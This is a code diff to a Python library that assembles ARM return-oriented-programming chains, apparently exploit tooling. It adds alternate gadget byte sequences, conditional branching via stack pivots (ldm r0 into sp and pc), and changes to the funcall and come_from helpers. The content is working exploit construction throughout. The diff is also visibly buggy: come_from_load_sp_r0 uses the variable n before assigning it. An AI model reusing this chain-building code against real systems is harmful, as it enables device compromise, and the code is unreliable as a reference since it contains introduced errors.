@@ -74,11 +74,12 @@ def funcall(funcaddr, *args, **kwargs):
     assert set(['load_r0', 'alt', 'alt2']).issuperset(kwargs)
     alt = kwargs.get('alt', 0)
         
-    while len(args) < 4: args += (0,)
-    if args[0] is None:
-        set_r1to3(args[1], args[2], args[3])
-    else:
-        set_r0to3(args[0], args[1], args[2], args[3], alt=kwargs.get('alt2', 0))
+    if len(args) != 0:
+        while len(args) < 4: args += (0,)
+        if args[0] is None:
+            set_r1to3(args[1], args[2], args[3])
+        else:
+            set_r0to3(args[0], args[1], args[2], args[3], alt=kwargs.get('alt2', 0))
     
     if kwargs.get('load_r0'): load_r0_r0()
 
@@ -113,17 +114,26 @@ def store_deref_plus_offset(deref, offset, value):
     add_r0_const(offset)
     store_to_r0(value)
 
-def cmp_r0_0_set_r0(zero, nonzero):
-    # cmp r0, #0; ite ne; mov r0, r4; mov r0, r5; pop {r4, r5, r7, pc}
-    gadget(R4=nonzero, R5=zero, PC='+ 00 28 14 bf 20 46 28 46 b0 bd', a='R4, R5, R7, PC')
+def cmp_r0_0_set_r0(zero, nonzero, alt=0):
+    if alt == 0:
+        # cmp r0, #0; ite ne; mov r0, r4; mov r0, r5; pop {r4, r5, r7, pc}
+        gadget(R4=nonzero, R5=zero, PC='+ 00 28 14 bf 20 46 28 46 b0 bd', a='R4, R5, R7, PC')
+    else:
+        # cmp r0, #0; ite eq; moveq r0, r4; movne r0, #0; sub sp, r7, #4; pop {r4, r7, pc}
+        m = pointed('')
+        gadget(R4=(zero - nonzero) & 0xffffffff, R7=pointer(m) + 4, PC='+ 00 28 0c bf 20 46 00 20 a7 f1 04 0d 90 bd', b=[m], a='R4, R7, PC')
+        add_r0_by(nonzero)
 
-def cmp_r0_0_branch():
+def cmp_r0_0_branch(alt=0):
     zero, nonzero = pointed(''), pointed('')
-    # pop {r4, r7, pc}
     # ldm r0, {r2, r3, sp, pc}
+    # pop {r4, r7, pc}
     m_a = dmini.cur.find('+ 90 bd')
-    cmp_r0_0_set_r0(ptrI(zero, m_a) - 8, ptrI(non_zero, m_a) - 8)
-    set_fwd('PC', dmini.cur.find('- 0c a0 90 e8'))
+    cmp_r0_0_set_r0(ptrI(pointer(zero), m_a) - 8, ptrI(pointer(nonzero), m_a) - 8, alt=alt)
+    if alt == 0:
+        set_fwd('PC', dmini.cur.find('- 0c a0 90 e8'))
+    else:
+        set_fwd('PC', dmini.cur.find('- 08 a8 90 e8'))
     clear_fwd()
     return zero, nonzero
 
@@ -160,11 +170,15 @@ def load_sp_r0():
     clear_fwd()
 
 def come_from_load_sp_r0(m):
-    come_from(m, 'R0, R2, R3, R4, R12, SP, LR, PC')
-    m = pointed('')
-    set_fwd('SP', pointer(m))
+    come_from(n, 'R0, R2, R3, R4, R12, SP, LR, PC')
+    n = pointed('')
+    set_fwd('SP', pointer(n))
     heapadd(m)
 
 def come_from(m, a='R4, R7, PC'):
+    try:
+        set_fwd('PC', dmini.cur.find('+ 90 bd'))
+    except:
+        pass
     clear_fwd()
     heapadd(m, *map(fwd, a.split(', ')))
